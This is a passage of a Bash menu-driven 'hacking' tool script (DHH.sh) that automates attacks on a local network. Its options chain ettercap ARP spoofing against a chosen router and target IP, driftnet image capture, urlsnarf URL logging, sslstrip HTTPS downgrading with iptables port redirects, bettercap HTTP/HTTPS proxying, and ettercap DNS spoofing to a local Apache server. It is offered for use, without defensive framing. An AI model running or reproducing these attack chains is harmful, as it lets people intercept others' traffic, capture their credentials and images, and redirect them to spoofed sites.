echo -n "Do You Want Install Macchanger $BLUE? [Y/N] :$RED "
read s
if [[ $s = Y || $s = y ]];then
clear
echo
echo
echo "======Install Macchanger for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install macchanger
echo
echo $GREEN"Done! macchanger has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
clear
echo
echo ""
echo $RED"{-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-}"
echo $RED"{$BLUE-----------------------------------------------------------------------$RED}"
echo $RED"{$BLUE simple tool for changer your mac address :)$RED                           }"
echo $RED"{$GREEN by <---Oseid Aldary--->$RED                                               }"
echo $RED"{ We Are Anonymous Arabs!            Hackers :p                         }"
echo $RED"{$BLUE-----------------------------------------------------------------------$RED}"
echo $RED"{=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-}"
echo ""
echo ""
echo ""
echo ""
echo $BLUE"                    please wait............"
sleep 3
echo
echo ""$RED
echo 
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo
echo "" $GREEN

echo -n " [*]Enter Your Interface : $RED "
read NIC
clear
echo ""
sleep 2
echo
echo "" $RED
echo " ##########################################################"
echo " ################$GREEN     What You Want$RED       #################"
echo " ##########################################################"$BLUE
echo " "
echo " 1 - RANDOM MAC ADDRESS"
echo ""
echo " 2 - CUSTOM MAC ADDRESS$GREEN[SPOOFING MAC ATTACK]"$RED
echo ""$GREEN 
echo -n "ENTER YOUR CHOICE [1/2] : $RED"
read coi
echo
if [[ $coi == '' ]];then
clear
./DHH.sh
else
if [ $coi = 1 ];then
clear
echo $GREEN""
echo $GREEN""
echo $GREEN"               ////////////////////////////////////////////////"
echo $GREEN"             <+[*]change your mac address to the random mac :)+"
echo $GREEN"               \///////////////////////////////////////////////"
echo $GREEN""
echo $GREEN""
echo ""
echo $BLUE"                                  please wait.........." $BLUE
echo ""
echo ""
echo "" ""$GREEN
sleep 2 
echo " [*]Down your Interface........ "
echo
ifconfig $NIC down
echo
sleep 3
echo
echo ""$RED
echo "[*]Done! your Interface down "
sleep 3
echo ""
echo ""$GREEN
echo " [*]change your MAC address......... "
echo
sleep 3
echo
macchanger -r $NIC
sleep 2
echo ""
echo ""$GREEN
echo "[*] Up your Interface......... "
echo
ifconfig $NIC up
sleep 3
echo ""$RED
echo "[*]Done! your Interface UP "
sleep 2
echo
echo ""$GREEN
echo "[*]restart your network-manager........."
echo
sleep 1
service network-manager restart
echo
sleep 3
echo ""$RED
echo "[*]Done! your network-manger restart "
sleep 3
echo
echo
echo ""
echo $GREEN"[*]$BLUE-->>${RED}your MAC address has been changed now$BLUE <<--"
sleep 1
echo
echo ""$GREEN
read -p "prees Enter to back to menu "
echo
echo
clear
./DHH.sh
else
if [ $coi = 2 ];then
clear
echo
echo ""$GREEN
echo " [*]Down your Interface........ "
echo
ifconfig $NIC down
sleep 3
echo
echo
echo "$RED[*]Done! your Interface Down"
sleep 3
echo ""
echo ""
echo "" $GREEN
echo -n "Enter Mac Address to spoof on him [:>$RED "
read mac
clear
echo "" $GREEN
echo -n "[؟]Do You Want To Spoof Your Mac Address To This Mac Address $RED >> $BLUE $mac $RED << $GREEN ? [Y/N] : $RED " 
read cv
if [[ $cv = N || $cv = n ]];then
ifconfig $NIC up && service network-manager restart
clear
./DHH.sh
else
if [[ $cv = Y || $cv = y ]];then
clear
echo
echo
echo ""
echo $GREEN
echo $GREEN
echo $GREEN"               ////////////////////////////////////////////////////////////////////////"
echo $BLUE "             <+[*]change your mac Address to this mac Address"" $GREEN>>$BLUE $mac $GREEN<< "
echo $GREEN"               \///////////////////////////////////////////////////////////////////////"
echo
echo
echo
echo $BLUE"                                  please wait.........." $BLUE
echo 
echo 
echo ""$GREEN 
sleep 6 
echo " [*]change your MAC address......... "
sleep 3
echo ""
echo ""
echo ""
macchanger -m $mac $NIC
echo ""
echo ""
sleep 2
echo ""
echo ""
echo $GREEN"[*] Up your Interface....... "
sleep 2
ifconfig $NIC up
sleep 3
echo
echo $RED"[*]Done! your Interface up"
sleep 3
echo
echo
echo
echo $GREEN"[*]restart your Network-manager..........."
echo
service network-manager restart
echo
sleep 3
echo
echo $RED"[*]Done! your Network-manager restart "
echo ""
echo ""
echo ""
sleep 2
echo $BLUE"[*]-->>Done!<<>>Your Mac Address has been changer to this mac $BLUE>> $RED $mac $BLUE <<"
sleep 3
echo
echo
read -p "press Enter to back to the menu "
echo
echo
clear
./DHH.sh
fi
fi
fi
fi
fi
else
if [ $choice = 10 ];then
clear
echo "" $BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 2
clear
echo
echo ""
echo ""
echo "Finding Your public IP address....."
sleep 4
echo ""
echo
echo "[*]Found Your public IP address is..."
sleep 3
echo "-------------"
sleep 1
echo "[ `wget -q -O - checkip.dyndns.org | sed -e 's/[^[:digit:]|.]//g'` ]"
echo "-------------"
echo
read -p "press Enter to back to the menu "
clear
./DHH.sh
else
if [ $choice = 11 ];then
clear
echo "" $BLUE
echo "checking if $RED[Netdiscover]$BLUE exists$RED........"
sleep 2
echo
if [ -f /usr/sbin/netdiscover ];then 
echo "$BLUE[*]$RED:$BLUE[Netdiscover]:${white}installation found...$BLUE"
sleep 2
else
echo
echo "$RED[!]${GREEN}Netdiscover is not installation "
echo
th=this
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Netdiscover]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Netdiscover $BLUE? [Y/N] :$RED "
read s
if [[ $s = Y || $s = y ]];then
clear
echo
echo
echo "======Install Netdiscover for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install netdiscover
echo
echo $GREEN"Done! Netdiscover has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo
echo "" $BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
echo
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo $BLUE"[*]$GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $GREEN"========FIND LIVE HOSTS IN YOUR NETWORK==========="
sleep 3
echo ""
sleep 3
echo 
echo ""$RED
echo "[*]Finding your interfaces........"
sleep 4
echo
echo ""$BLUE
echo "[*]Found this is your interfaces >>

$intarall << "
echo
echo ""$GREEN

echo -n "Enter your interface conncet :> $RED"
read IFACE;
echo ""
echo ""
clear
echo ""
echo ""
echo "Your Gateway is >> $netinfo << "
echo $GREEN
echo -n "Enter your gateway :>  $RED"
read GATEWAY; 
sleep 2
clear
echo ""
echo ""
echo ""
echo $BLUE"                   Press CTRL+C to stop and close netdiscover"
echo ""
echo ""
sudo xterm -bg black -fg green -e netdiscover -i $IFACE -r $GATEWAY/24
clear
./DHH.sh
else
if [ $choice = 12 ];then
clear
echo "" $BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
echo  
ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo "" $BLUE
echo "Open your router control panel...."
firefox $netinfo
clear
./DHH.sh
else
if [ $choice = 13 ];then
nano /etc/ettercap/etter.dns

clear
./DHH.sh
else
if [ $choice = 14 ];then
nano /etc/ettercap/etter.conf
clear
./DHH.sh
else
if [ $choice = 15 ];then
{
clear
echo "" $BLUE	
echo "checking if $RED[ETTERCAP]$BLUE exists$RED........"
sleep 2
echo
if [ -f /usr/bin/ettercap ];then 
echo "$BLUE[*]$RED:$BLUE[Ettercap]:${white}installation found...$BLUE"
sleep 2
else
th=this
echo
echo "$RED[!]${GREEN}Ettercap is not installation!"
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Ettercap]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Ettercap $BLUE? [Y/N] :$RED "
read s
if [[ $s = Y || $s = y ]];then
clear
echo
echo
echo "======Install ettercap for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install ettercap-common && apt-get -y install ettercap-graphical && apt-get -y install ettercap-dbg && apt-get -y install ettercap-text-only 
echo
echo $GREEN"Done! ettercap has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
echo
clear
echo
echo "" $RED
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo ""
echo ""$GREEN
echo -n "[*]Enter Your Interface connect : "$RED
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
echo
exit
fi
clear
echo
echo "" $GREEN
echo -n "Enter your router ip :$RED "
read rou
clear
echo
echo "" $GREEN
echo -n "Enter your target ip :$RED "
read targ
clear
echo
echo "" $GREEN
echo "$BLUE[*]$RED:${GREEN}sniffing has been started on$BLUE [[$RED->$BLUE $targ $RED<-$BLUE]]"
sleep 4
echo "" $RED

ettercap -T -Q -i $interface -P remote_browser -M arp /$rou// /$targ//
clear
./DHH.sh

}

else

if [ $choice = 16 ];then 
{
clear
echo "" $BLUE
echo "checking if $RED[ETTERCAP]$BLUE exists$RED........"
sleep 2
echo
if [ -f /usr/bin/ettercap ];then 
echo "$BLUE[*]$RED:$BLUE[Ettercap]:${white}installation found...$BLUE"
sleep 2
else
th=this
echo
echo "$RED[!]${GREEN}Ettercap is not installation "
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Ettercap]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Ettercap $BLUE? [Y/N] :$RED "
read s
if [[ $s = Y || $s = y ]];then
clear
echo
echo
echo "======Install ettercap for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install ettercap-common && apt-get -y install ettercap-graphical && apt-get -y install ettercap-dbg && apt-get -y install ettercap-text-only 
echo
echo $GREEN"Done! ettercap has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking if $RED[DRIFTNET]$BLUE exists$RED........"
sleep 2
if [ -f /usr/bin/driftnet ];then
echo
echo "$BLUE[*]$RED:$BLUE[Driftnet]:${white}installation found...$BLUE"
sleep 2
else
th=this
echo
echo "$RED[!]${GREEN}Driftnet in not installation  "
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Driftnet]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Driftnet $BLUE? [Y/N] :$RED "
read ss
if [[ $ss = Y || $ss = y ]];then
clear
echo
echo
echo "======Install driftnet for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install driftnet 
echo
echo $GREEN"Done! Driftnet has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
sleep 2
echo
  ping -i 01 -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3 
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo ""
sleep 2
echo
echo "" $RED
echo " ##########################################################"
echo " ################$GREEN     What You Want$RED       #################"
echo " ##########################################################"$BLUE
echo " "
echo " 1 - SNIFF ON [1] TARGET Pictures IN NETWORK"
echo ""
echo " 2 - SNIFF ON [ALL] TARGETS Pictures IN NETWORK"$RED
echo ""$GREEN 
echo -n "ENTER YOUR CHOICE [1/2] : $RED"
read coi
if [ $coi = 1 ];then
clear
echo
echo
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo ""
echo ""$GREEN
echo -n "[*]Enter Your Interface connect :$RED "
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
echo
exit
fi
clear
echo
echo $GREEN
echo -n "Enter your router ip :$RED "
read rou
clear
echo
echo "" $GREEN
echo -n "Enter your target ip : $RED"
read targ
clear
echo
echo "" $GREEN
echo "sniffing has been started on$BLUE [[$RED->$BLUE $targ $RED<-$BLUE]]"
sleep 4
echo "" $RED
cd $path
if [ -d target-images ];then
echo "" $GREEN
echo "target-images Found"
else
mkdir target-images > /dev/null 2>&1
fi
echo '1' >/proc/sys/net/ipv4/ip_forward
sleep 1
sudo xterm -e driftnet -i $interface -d target-images & 

sudo xterm -e ettercap -T -Q -i $interface -M arp:remote /$targ// /$rou// &

echo ""$GREEN
read -p "[*]$RED:$GREEN press Enter to stop all processes"
killall xterm
echo '0' >/proc/sys/net/ipv4/ip_forward
sleep 1
echo "$RED[*]${GREEN}Done!"
sleep 2
     clear
./DHH.sh


else
if [ $coi = 2 ];then
clear
echo
echo
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo ""
echo ""$GREEN
echo -n "[*]Enter Your Interface connect :$RED "
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
echo
exit
fi
echo
echo 
if [ $interface = wlan0 ];then
echo '1' >/proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $interface -o wlan1 -j ACCEPT
else
if [ $interface = eth0 ];then
echo '1' >/proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o $interface -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $interface -o eth1 -j ACCEPT
else
$interface=i
echo '1' >/proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o $i -j MASQUERADE
iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $i -o $i -j ACCEPT
fi
fi
cd $path
if [ -d target-images ];then
echo "" $GREEN
echo "target-images Found"
else
mkdir target-images > /dev/null 2>&1
fi
clear
echo $BLUE
echo
echo "please wait$RED............." 
sleep 3
clear
echo
echo
star="Starting Sniffing On All Target In Your Network" 
echo "$BLUE[*]$RED:$GREEN$star"$BLUE
sleep 2
xterm -e driftnet -i $interface -d target-images &
echo
read -p "$BLUE[*]$RED:${GREEN}Press Ente to stop and sniffing "
killall xterm
kill driftnet
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo $BLUE"[*]$RED:Done! "
sleep 4
fi
fi
clear
./DHH.sh

}

else
if [ $choice = 17 ];then
{
clear
echo "" $BLUE
echo "checking if $RED[BETTERCAP]$BLUE exists$RED........"
sleep 2
if [ -f /usr/bin/bettercap ];then
echo
echo "$BLUE[*]$RED:$BLUE[Bettercap]:${white}installation found...$BLUE"
sleep 2
else
th=this
echo
echo "$RED[!]${GREEN}bettercap is not installation "
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[BETTERCAP]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install bettercap $BLUE? [Y/N] :$RED "
read ss
if [[ $ss = Y || $ss = y ]];then
clear
echo
echo
echo "======Install bettercap for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install bettercap
echo
echo $GREEN"Done! Bettercap has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo ""$BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]
then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo $GREEN
echo  -n "Enter target ip in your networke [example: 192.168.1.7]  : $RED"
read target
clear
echo
echo
echo "" $GREEN
echo "sniffing has been started on$BLUE [[$RED->$BLUE $target $RED<-$BLUE]]"
sleep 3
echo "" $RED
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 10000
echo '1' >/proc/sys/net/ipv4/ip_forward
xterm -T "DHH - SNIFF [SSL[https]" -geometry 110x23 -e "bettercap -X -T $target --spoof ARP --proxy-http --proxy-https"
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
clear
./DHH.sh

}

else
if [ $choice = 18 ];then
clear
echo "" $BLUE
echo "checking if $RED[ETTERCAP]$BLUE exists$RED........"
sleep 2
echo
if [ -f /usr/bin/ettercap ];then 
echo "$BLUE[*]$RED:$BLUE[Ettercap]:${white}installation found...$BLUE"
sleep 2
else
th=this
echo
echo "$RED[!]${GREEN}Ettercap is not installation "
echp
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Ettercap]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Ettercap $BLUE? [Y/N] :$RED "
read s
if [[ $s = Y || $s = y ]];then
clear
echo
echo
echo "======Install ettercap for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install ettercap-common && apt-get -y install ettercap-graphical && apt-get -y install ettercap-dbg && apt-get -y install ettercap-text-only 
echo
echo $GREEN"Done! ettercap has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]
then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo ""$RED
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo ""
echo ""$GREEN
echo -n "[*]Enter Your Interface connect : $RED"
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
echo
exit
fi
echo
echo $GREEN
echo -n "Enter your router ip [example: 192.168.1.1] : $RED"
read rou
echo
echo "" $GREEN
echo
echo -n "Enter target ip in your networke [example: 192.168.1.7]  : $RED"
read targ
clear
echo
echo "" $GREEN
echo "sniffing has been started on$BLUE [[$RED->$BLUE $targ $RED<-$BLUE]]"
sleep 3
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 10000
echo '1' >/proc/sys/net/ipv4/ip_forward
xterm -T "DHH.sh - mitm Attack" -geometry 99x23 -e "ettercap -T -Q -i $interface -M arp:remote /$rou// /$targ//"
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
clear
./DHH.sh
else
if [ $choice = 19 ];then
clear
echo "" $BLUE
echo "checking if $RED[ETTERCAP]$BLUE exists$RED........"
sleep 2
if [ -f /usr/bin/ettercap ];then
echo
echo "$BLUE[*]$RED:$BLUE[Eettercap]:${white}installation found...$BLUE"
sleep 2
echo
else
th=this
echo
echo "$RED[!]${GREEN}Ettercap is not installation "
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[ETTERCAP]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Eettercap $BLUE? [Y/N] :$RED "
read ss
if [[ $ss = Y || $ss = y ]];then
clear
echo
echo
echo "======Install ettercap for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install ettercap-common && apt-get -y install ettercap-graphical && apt-get -y install ettercap-dbg && apt-get -y install ettercap-text-only 
echo
echo $GREEN"Done! Ettercap has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking if $RED[Driftnet]$BLUE exists$RED........"
sleep 2
if [ -f /usr/bin/driftnet ];then
echo
echo "$BLUE[*]$RED:$BLUE[Driftnet]:${white}installation found...$BLUE"
sleep 2
echo
else
th=this
echo
echo "$RED[!]${GREEN}Driftnet is not installation"
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Driftnet]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Driftnet $BLUE? [Y/N] :$RED "
read ss
if [[ $ss = Y || $ss = y ]];then
clear
echo
echo
echo "======Install Driftnet for you======="
sleep 4
echo "[*]working........."
sleep 1
sudo apt-get -y driftnet 
echo
echo $GREEN"Done! Driftnet has been installed !"
echo
read -p "now press Enter to continue:)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking if $RED[URLSNARF]$BLUE exists$RED........"
sleep 2
if [ -f /usr/sbin/urlsnarf ];then
echo
echo "$BLUE[*]$RED:$BLUE[Urlsnarf]:${white}installation found...$BLUE"
sleep 2
else
th=this
echo
echo "$RED[!]${GREEN}Urlsnarf is not installation"
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Urlsnarf]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Urlsnarf $BLUE? [Y/N] :$RED "
read ss
if [[ $ss = Y || $ss = y ]];then
clear
echo
echo
echo "======Install Urlsnarf for you======="
sleep 4
echo "[*]working........."
sleep 1
git clone -q --depth 1 https://github.com/Oseid/urlsnarf.git
cd urlsnarf/
chmod +x *
cp urlsnarf /usr/sbin/
cd ..
rm -r urlsnarf
sleep 2
echo
echo $GREEN"Done! urlsnarf has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking if $RED[SSLSTRIP]$BLUE exists$RED........"
sleep 2
if [ -f /usr/bin/sslstrip ];then
echo
echo "$BLUE[*]$RED:$BLUE[Sslstrip]:${white}installation found...$BLUE"
sleep 2
echo
else
th=this
echo
echo "$RED[!]${GREEN}Sslstrip is not installation"
echo
echo $RED[x]:[waring]:$BLUE$th module needs $RED[Sslstrip]$BLUE to work
echo
echo ""$GREEN
echo -n "Do You Want Install Sslstrip $BLUE? [Y/N] :$RED "
read ss
if [[ $ss = Y || $ss = y ]];then
clear
echo
echo
echo "======Install Sslstrip for you======="
sleep 4
echo "[*]working........."
sleep 1
apt-get -y install sslstrip  
sleep 2
echo
echo $GREEN"Done! sslstrip has been installed !"
echo
read -p "now press Enter to continue :)"
clear
else
if [[ $s = N || $s = n ]];then
clear
./DHH.sh
fi
fi
fi
echo "" $BLUE
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]
then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo ""$RED
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo ""
echo ""$GREEN
echo -n "[*]Enter Your Interface connect : $RED"
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
echo
exit
fi
echo
echo $GREEN
echo -n "Enter your router ip [example: 192.168.1.1] : $RED"
read rou
echo ""
echo ""
echo ""
clear
echo
echo ""
echo "$BLUE[*]$RED:$GREEN Attacks has been started on$RED[$BLUE>$GREEN $rou $BLUE<$RED]"
sleep 2
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 10000
echo "1" > /proc/sys/net/ipv4/ip_forward 
cd $path
if [ -d target-images ];then
echo "" $GREEN
echo "target-images Found"
else
mkdir target-images > /dev/null 2>&1
fi
if [ -f $path/sslstrip.log ];then
rm -R sslstrip.log
else
echo "OK"
fi

sudo xterm -e driftnet -i $interface -d target-images &
 

sudo xterm -e urlsnarf -i $interface &


sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT  --to-port 10000


sudo xterm -e ettercap -TqM arp:remote /// &


sudo xterm -e sslstrip -a -l 10000 &




echo ""$BLUE
echo "[*]$RED:${GREEN}press Enter to stop all processes"
sleep 3
read ENTERKEY

killall sslstrip
killall ettercap
killall urlsnarf
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
     clear
./DHH.sh
else

if [ $choice = 20 ];then

function dnsA {
clear
echo
echo "${BLUE}please wait.............."
sleep 3
clear
echo
echo "" $RED
echo " ##########################################################"
echo " ################$GREEN     What You Want$RED       #################"
echo " ##########################################################"$BLUE
echo " "
echo " 1 - Edit etter.dns "
echo ""
echo " 2 - Starting Dns-spoof "$RED
echo ""
echo " 3 - Exit"
echo ""$GREEN 
echo -n "ENTER YOUR CHOICE [1/2/3] : $RED"
read coi
if [ $coi = 3 ];then
clear
exit
else
if [ $coi = 1 ];then
clear
echo
echo
echo "$BLUE[*]$RED:${GREEN}please Edit you dns file to spoof all targets on your server !"
sleep 3
nano /etc/ettercap/etter.dns
echo
echo ""$GREEN
read -p "now press Enter to back and starting Dns-spoof"
clear
dnsA
else
if [ $coi = 2 ];then
clear
echo
echo "" $RED
echo -n " [*]Finding your Network Interfaces... "$GREEN
sleep 2
echo ""$BLUE
echo ""

ifconfig -a | cut -d " " -f1 | sed '/^$/d' | egrep -v 'lo|vm'

echo ""
echo ""$GREEN
echo -n "[*]Enter Your Interface connect : "$RED
read interface
if [[ $interface = '' ]];then
clear
echo
echo
echo "You Not Enter the Interface !? "
echo
exit
fi
clear
echo
echo "" $GREEN
echo -n "Enter your router ip :$RED "
read rou
clear
echo
echo "" $GREEN
echo -n "Enter your target ip :$RED "
read targ
clear
echo
echo "[*]$RED:$BLUE STARTING APACHE SERVER$RED.........."
sleep 2
xterm -T "DHH - start Apache webserver" -geometry 110x23 -e "service apache2 start"
         echo $BLUE[*]$RED:$RED[start apache2]$RED:$GREEN[ OK ]
sleep 2
echo 
echo "[*]Done apache server has been started " 
sleep 2
clear
echo "" $GREEN
echo "$BLUE[*]$RED:${GREEN}DNS-SPOOF has been started on$BLUE [[$RED->$BLUE $targ $RED<-$BLUE]]"
sleep 4
echo "" $RED
echo '1' > /proc/sys/net/ipv4/ip_forward
xterm -T "DHH - DNS-Spoofing" -geometry 99x23 -e "ettercap -T -Q -i $interface -P dns_spoof -M arp:remote /$rou// /$targ//" &
echo
echo "$BLUE[*]$RED:${GREEN}Press Enter to stop Dns-spoof attack on [>${RED}$targ$GREEN<] "
read op
killall xterm
echo "0" > /proc/sys/net/ipv4/ip_forward
clear
fi
fi
fi

}
while true; do dnsA; done

else
if [ $choice = 21 ];then
clear
exit
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
fi
else
if [ $word = 4 ] ;then
clear
echo
echo
function NetSniper {
clear
echo
echo "" $GREEN
echo -n "Do you want install Netsniper ? [Y/N] :$RED "
read yes
if [[ $yes = y || $yes = Y ]];then 
clear
echo
echo "checking $RED[internet]$BLUE connections$RED........"
echo
  ping -c 1 google.com > /dev/null 2>&1
  if [ "$?" != 0 ]

then
sleep 3
clear
echo
echo
echo $GREEN"[!]you not connect to the internet ! "$BLUE
echo
echo "[!]please Connect to the internet and try again :) " 
echo
exit
fi
echo
echo "$BLUE[*] $GREEN[ CONNECT ]"
sleep 1
clear
echo
echo
echo $BLUE"=====Install NetSniper for you====="
sleep 4
echo $GREEN"[*]working....."
sleep 1
git clone https://github.com/Oseid/NetSniper.git
echo $GREEN"[*]Finishing......"
sleep 7
clear
else
if [[ $yes = N || $yes = n ]];then
clear
fi
fi

}

function HashCreate {
clear
echo
echo "" $GREEN
